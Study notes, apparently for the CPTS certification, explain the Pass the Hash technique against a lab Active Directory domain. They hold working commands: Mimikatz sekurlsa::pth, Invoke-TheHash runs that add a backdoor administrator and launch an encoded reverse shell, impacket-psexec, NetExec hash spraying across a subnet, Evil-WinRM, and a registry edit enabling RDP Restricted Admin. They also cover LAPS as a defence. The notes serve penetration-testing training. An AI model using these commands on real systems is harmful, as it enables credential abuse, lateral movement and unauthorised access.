# 🔐 1. Pass the Hash (PtH)

> [!info]  
> **Pass the Hash (PtH)** is an authentication technique where an attacker uses a user's **password hash directly** instead of knowing or recovering the plaintext password.
> 
> The attacker does **not** need to crack/decrypt the hash first. PtH abuses authentication mechanisms that accept the hash as authentication material.

### 🧠 Core Mental Model

```text
Normally:

Password
   ↓
Authentication
   ↓
Access


Pass the Hash:

NTLM Hash
   ↓
Authentication
   ↓
Access
```

The key idea:

> **If you have a usable NTLM hash, you may be able to authenticate without knowing the password.**

---

# 🎯 2. Where Can We Get Hashes?

Obtaining a password hash generally requires **administrative or equivalent privileges** on the target.

Common sources include:

```text
🗄️ Local SAM database
        ↓
   Local account hashes

🗄️ NTDS.dit
        ↓
   Domain account hashes

🧠 LSASS memory
        ↓
   Credential material / hashes
```

The source material specifically identifies:

- Dumping the local **SAM** database
    
- Extracting hashes from **NTDS.dit** on a Domain Controller
    
- Pulling hashes from **LSASS (`lsass.exe`)**
    

---

# 🧬 3. NTLM and Pass the Hash

## 🔎 3.1 What Is NTLM?

**NTLM (Windows New Technology LAN Manager)** is a collection of Windows security protocols used for authentication and protection of communications.

NTLM uses a **challenge-response** authentication process rather than sending the user's plaintext password across the network.

```text
Client                         Server
  │                              │
  │──── Authentication Request ──►│
  │                              │
  │◄────── Challenge ────────────│
  │                              │
  │──── Response ────────────────►│
  │                              │
  │         ✅ Authenticated       │
```

NTLM remains supported largely for compatibility with legacy systems.

> [!important]  
> **Kerberos is the default authentication mechanism in modern Active Directory domains**, but NTLM remains important because legacy applications, systems, and authentication scenarios may still use it.

---

# 🔑 4. Why Does PtH Work?

The important property is that the NTLM password hash can serve as authentication material.

You don't necessarily need:

```text
plaintext password
```

if you already possess:

```text
NTLM hash
```

Therefore:

```text
Password
   ↓
 NTLM Hash
   ↓
┌─────────────────────┐
│ Password unavailable│
│ Hash obtained       │
└──────────┬──────────┘
           ↓
    Pass the Hash
           ↓
      Authentication
           ↓
         Access
```

> [!warning]  
> **A password hash should be treated as sensitive authentication material.** Possessing a hash may be enough to gain access to systems where PtH is supported and the account has the necessary permissions.

---

# 🪟 5. Pass the Hash with Mimikatz

[Mimikatz GitHub repository](https://github.com/gentilkiwi?utm_source=chatgpt.com)

Mimikatz provides the:


```text
sekurlsa::pth
```

```shell
sekurlsa::logonpasswords
```

module.

It can create a process using the supplied user's password hash.

### Required Parameters

|Parameter|Purpose|
|---|---|
|`/user`|Username to impersonate|
|`/rc4` or `/NTLM`|NTLM hash of the user's password|
|`/domain`|Domain of the user|
|`/run`|Program to execute using the user's context|

For a **local account**, `/domain` can use:

```text
ComputerName
localhost
.
```

If `/run` isn't specified, `cmd.exe` is launched.

---

## 💻 5.1 Mimikatz PtH Example

Given:

```text
User:   julio
Domain: inlanefreight.htb
NTLM:   64F12CDDAA88057E06A81B54E73B949B
```

Command:

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Important pieces:

```text
privilege::debug
       ↓
Obtain required Mimikatz debugging privilege

sekurlsa::pth
       ↓
Perform Pass the Hash

/user:julio
       ↓
Account

/rc4:<NTLM hash>
       ↓
Hash used for authentication

/domain:inlanefreight.htb
       ↓
Domain

/run:cmd.exe
       ↓
Create command shell
```

The example output confirms the supplied user, domain, NTLM hash, and newly created process.

---

# 🎯 6. What Happens After Mimikatz PtH?

Once the PtH process is created, the resulting `cmd.exe` can be used to execute commands in the user's context.

Conceptually:

```text
NTLM Hash
    ↓
Mimikatz
    ↓
sekurlsa::pth
    ↓
New cmd.exe
    ↓
User's authentication context
    ↓
Access resources available to that account
```

For example, the source scenario shows `julio` being able to connect to a shared folder on the Domain Controller.

---

# ⚡ 7. Invoke-TheHash — Windows

[Invoke-TheHash GitHub repository](https://github.com/Kevin-Robertson/Invoke-TheHash?utm_source=chatgpt.com)

**Invoke-TheHash** is a collection of PowerShell functions for performing PtH through:

- **SMB**
    
- **WMI**
    

Authentication uses the supplied NTLM hash through the NTLMv2 authentication protocol.

> [!important]  
> Client-side local administrator privileges are **not required**, but the supplied account/hash must have the required **administrative rights on the target computer** for administrative command execution.

---

# 🧩 8. Invoke-TheHash Parameters

|Parameter|Purpose|
|---|---|
|`Target`|Target hostname or IP address|
|`Username`|Username for authentication|
|`Domain`|Authentication domain|
|`Hash`|NTLM password hash|
|`Command`|Command to execute on target|

The `Domain` parameter isn't necessary for local accounts or when the domain is supplied with the username. The hash can be supplied as either **LM:NTLM** or **NTLM** format.

---

# 🛠️ 9. Invoke-TheHash — SMB Command Execution

First load the module:

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
```

Then execute a command using SMB:

```powershell
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

### 🧠 What Happens?

```text
julio + NTLM hash
        ↓
   SMB authentication
        ↓
Administrative access
        ↓
Service Control Manager
        ↓
Temporary service created
        ↓
Command executed
        ↓
Service deleted
```

The example output shows successful authentication, Service Control Manager write privileges, temporary service creation, command execution, and service deletion.

> [!important]  
> SMB command execution in this technique relies on having the necessary administrative privileges on the target.

---

# 🔄 10. Invoke-TheHash with WMI

Invoke-TheHash can also execute commands through **WMI**.

The source demonstrates using WMI to execute a PowerShell reverse shell command on `DC01`.

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <BASE64_PAYLOAD>"
```

The example results in command execution on `DC01`.

### 🧠 SMB vs WMI

```text
              Invoke-TheHash
                    │
           ┌────────┴────────┐
           ▼                 ▼
          SMB               WMI
           │                 │
           ▼                 ▼
     Invoke-SMBExec     Invoke-WMIExec
           │                 │
           └────────┬────────┘
                    ▼
            Remote execution
```

---

# 🐧 11. Pass the Hash with Impacket

[Impacket GitHub repository](https://github.com/SecureAuthCorp/impacket?utm_source=chatgpt.com)

Impacket is a collection of tools useful for:

- Command execution
    
- Credential dumping
    
- Enumeration
    
- Authentication attacks
    

For PtH, one useful tool is:

```text
impacket-psexec
```

---

# 💻 12. Impacket PsExec PtH

Example:

```bash
keelwa@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### 🧩 Important Syntax

```text
-hashes :NTLM_HASH
        │
        └── Empty LM hash + supplied NTLM hash
```

The example output shows Impacket:

```text
Requesting shares
      ↓
Finding writable ADMIN$
      ↓
Uploading executable
      ↓
Opening Service Control Manager
      ↓
Creating service
      ↓
Starting service
      ↓
Obtaining command shell
```

Result:

```text
C:\Windows\system32>
```

---

# 🧰 13. Other Impacket PtH Execution Tools

Besides `psexec`, the source identifies:

```text
impacket-wmiexec
impacket-atexec
impacket-smbexec
```

These provide alternative methods for remote command execution using PtH.

---

# 🌐 14. Pass the Hash with NetExec

[NetExec official Wiki](https://www.netexec.wiki/?utm_source=chatgpt.com)

NetExec can test authentication across multiple SMB hosts.

Example:

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### 🧩 Command Breakdown

```text
netexec smb
      ↓
Use SMB

172.16.1.0/24
      ↓
Target subnet

-u Administrator
      ↓
Username

-d .
      ↓
Local account / local computer context

-H <NTLM>
      ↓
Pass NTLM hash
```

---

# 🎯 15. Recognizing NetExec PtH Results

Example:

```text
DC01
[-] .\Administrator:HASH STATUS_LOGON_FAILURE

MS01
[+] .\Administrator HASH (Pwn3d!)
```

The important difference:

```text
❌ STATUS_LOGON_FAILURE
        ↓
Authentication failed


✅ Pwn3d!
        ↓
Authentication succeeded
        ↓
Account has local administrator privileges
```

> [!important]  
> In NetExec output, **`Pwn3d!` means the authenticated account has administrative privileges on the target** in this context.

---

# 🔁 16. Local Administrator Password Reuse

One particularly valuable PtH scenario occurs when organizations reuse the **same local administrator password/hash across multiple machines**.

For example:

```text
SAM dump from MS01
       ↓
Administrator NTLM hash
       ↓
Scan subnet
       ↓
       ├── PC01 ❌
       ├── PC02 ✅ Pwn3d!
       ├── PC03 ❌
       ├── PC04 ✅ Pwn3d!
       └── PC05 ✅ Pwn3d!
```

This can happen when organizations use:

- 🖼️ Gold images
    
- 🔁 Shared local administrator passwords
    
- ⚙️ Manual administration practices
    

---

# 🏠 17. `--local-auth`

If you specifically want to test whether a **local administrator hash** works across multiple hosts, use:

```text
--local-auth
```

This is useful when you obtained a local administrator hash from one host and want to determine whether the same credentials work elsewhere.

> [!warning]  
> Password/hash spraying across a network can have operational and account-lockout implications. The source specifically warns about account lockout policies and distinguishes local authentication from domain authentication.

---

# ⚙️ 18. NetExec Command Execution

Once administrative PtH authentication succeeds, NetExec can execute commands using:

```text
-x
```

Example:

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Output:

```text
[+] .\Administrator HASH (Pwn3d!)
[+] Executed command
MS01\administrator
```

---

# 🛡️ 19. LAPS — Defense Against Local Admin Hash Reuse

[Microsoft LAPS information](https://www.microsoft.com/en-us/download/details.aspx?id=46899&utm_source=chatgpt.com)

The source recommends **Local Administrator Password Solution (LAPS)** as a defense against local administrator password reuse.

The idea:

```text
❌ Without LAPS

PC01 ── Administrator password A
PC02 ── Administrator password A
PC03 ── Administrator password A


✅ With LAPS

PC01 ── Random password A
PC02 ── Random password B
PC03 ── Random password C
```

LAPS randomizes the local administrator password and can rotate it on a configured schedule.

> [!tip]  
> **From an attacker perspective:** local admin hash reuse can turn one compromised machine into access to many others.
> 
> **From a defender perspective:** unique, rotating local administrator passwords significantly reduce this risk.

---

# 🖥️ 20. Pass the Hash with Evil-WinRM

[Evil-WinRM GitHub repository](https://github.com/Hackplayers/evil-winrm?utm_source=chatgpt.com)

**Evil-WinRM** can authenticate using a PtH hash through **PowerShell Remoting / WinRM**.

This can be useful when:

- SMB is blocked
    
- SMB isn't suitable
    
- You need a PowerShell remote shell
    

Example:

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Successful authentication produces:

```text
Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### 🌐 Domain Accounts

For a domain account, include the domain:

```text
administrator@inlanefreight.htb
```

---

# 🖥️ 21. Pass the Hash with RDP

PtH can also be used to obtain **graphical RDP access** with `xfreerdp`.

```text
NTLM Hash
    ↓
xfreerdp
    ↓
RDP authentication
    ↓
🖥️ Graphical desktop
```

---

# ⚠️ 22. RDP PtH — Restricted Admin Mode

There is an important caveat:

**Restricted Admin Mode must be enabled on the target.**

If it isn't enabled, RDP PtH may fail with an account-restriction error.

The source gives the registry setting:

```text
HKLM\System\CurrentControlSet\Control\Lsa
```

with:

```text
DisableRestrictedAdmin
```

set to:

```text
0
```

Command:

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

# 💻 23. xfreerdp PtH

Once Restricted Admin is configured:

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

The important PtH option is:

```text
/pth:<NTLM_HASH>
```

The source example shows FreeRDP attempting the connection and displaying a certificate-name mismatch warning during the connection.

> [!warning]  
> A certificate warning is separate from whether the supplied PtH credentials are valid. Don't confuse TLS certificate validation messages with NTLM authentication success/failure.

---

# 🔒 24. UAC and PtH — Local Accounts

**User Account Control (UAC)** can restrict what local users can do during remote administration.

The relevant registry key is:

```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

### Value `0`

The built-in local Administrator account (**RID-500**) is the only local account allowed to perform remote administration tasks.

### Value `1`

Other local administrators can also perform remote administration tasks.

---

# ⚠️ 25. `FilterAdministratorToken` Exception

There is an important exception.

If:

```text
FilterAdministratorToken = 1
```

the RID-500 Administrator account is enrolled in UAC protection.

This can cause remote PtH to fail even when using the built-in Administrator account.

This applies to local administrative accounts.

---

# 🧩 26. Local vs Domain PtH

This distinction is extremely important:

|Account Type|UAC Local Token Filtering Relevant?|PtH|
|---|--:|---|
|Local administrative account|✅ Yes|Can be restricted by UAC settings|
|Domain account with administrative rights|❌ Not governed by these local-account restrictions|PtH can still work|

The source specifically notes that if a **domain account has administrative rights on a computer**, PtH can still be used against that computer.

---

# 🧠 27. PtH Attack Decision Tree

```text
              🔑 NTLM HASH
                   │
                   ▼
          What access do you need?
                   │
        ┌──────────┼───────────┬──────────┐
        ▼          ▼           ▼          ▼
      Shell       SMB         WinRM       RDP
        │          │            │          │
   Mimikatz    NetExec /    Evil-WinRM   xfreerdp
               Impacket
        │          │            │          │
        ▼          ▼            ▼          ▼
     Windows    Remote       PowerShell   GUI
     process    command        shell      access
```

---

# ⚔️ 28. PtH Tool Cheat Sheet

|Tool|Platform|Method|Key Syntax|
|---|---|---|---|
|**Mimikatz**|Windows|Local process / PtH|`sekurlsa::pth`|
|**Invoke-TheHash**|Windows|SMB / WMI|`Invoke-SMBExec`, `Invoke-WMIExec`|
|**Impacket**|Linux|SMB / PsExec / WMI / AT / SMBExec|`impacket-psexec ... -hashes :HASH`|
|**NetExec**|Linux|SMB authentication / command execution|`-H HASH`|
|**Evil-WinRM**|Linux|WinRM / PowerShell Remoting|`-H HASH`|
|**xfreerdp**|Linux|RDP|`/pth:HASH`|

---

# 🔥 29. PtH Authentication Workflow

```text
🔎 OBTAIN HASH
      │
      ├── SAM
      ├── NTDS.dit
      └── LSASS
      │
      ▼
🧬 IDENTIFY NTLM HASH
      │
      ▼
🎯 IDENTIFY TARGET
      │
      ▼
🔐 CHOOSE PROTOCOL
      │
      ├── SMB
      │     └── NetExec / Impacket / Invoke-TheHash
      │
      ├── WMI
      │     └── Invoke-TheHash / Impacket
      │
      ├── WinRM
      │     └── Evil-WinRM
      │
      └── RDP
            └── xfreerdp
      │
      ▼
✅ AUTHENTICATE WITHOUT PLAINTEXT PASSWORD
      │
      ▼
🎯 REMOTE ACCESS / COMMAND EXECUTION
```

---

# 🧠 30. CPTS Exam Mental Model

> [!important]  
> **Pass the Hash is not password cracking.**
> 
> You don't need to recover:
> 
> `NTLM hash → plaintext password`
> 
> Instead:
> 
> `NTLM hash → authentication → access`

### Remember the Three Questions

```text
1️⃣ Do I have a usable NTLM hash?
             ↓
2️⃣ Does the target accept PtH through an available protocol?
             ↓
3️⃣ Does the account have sufficient privileges on the target?
```

If the answer is **yes** to all three, PtH may provide access without knowing the plaintext password.

---

# 🎯 31. Key Takeaways

> [!success]
> 
> - **Pass the Hash (PtH)** uses a password hash directly for authentication instead of the plaintext password.
>     
> - Common hash sources include **SAM, NTDS.dit, and LSASS**.
>     
> - **NTLM** is particularly relevant to PtH because the NTLM hash can be used as authentication material.
>     
> - **Mimikatz** uses `sekurlsa::pth` to create a process using the supplied hash.
>     
> - **Invoke-TheHash** supports PtH through **SMB and WMI**.
>     
> - **Impacket** provides several PtH execution methods including `psexec`, `wmiexec`, `atexec`, and `smbexec`.
>     
> - **NetExec** can test hashes against many SMB hosts and identify local-admin access with `Pwn3d!`.
>     
> - `--local-auth` is useful when testing **local administrator password/hash reuse** across hosts.
>     
> - **LAPS** helps defend against local administrator password reuse by providing unique, rotating passwords.
>     
> - **Evil-WinRM** provides PtH access through WinRM/PowerShell Remoting.
>     
> - **xfreerdp** can perform RDP PtH when the target supports **Restricted Admin Mode**.
>     
> - **UAC can restrict PtH for local accounts**, while domain accounts with administrative rights can still be used for PtH.
>     
> - The most important concept: **a stolen NTLM hash can sometimes be as valuable as a stolen plaintext password.**
>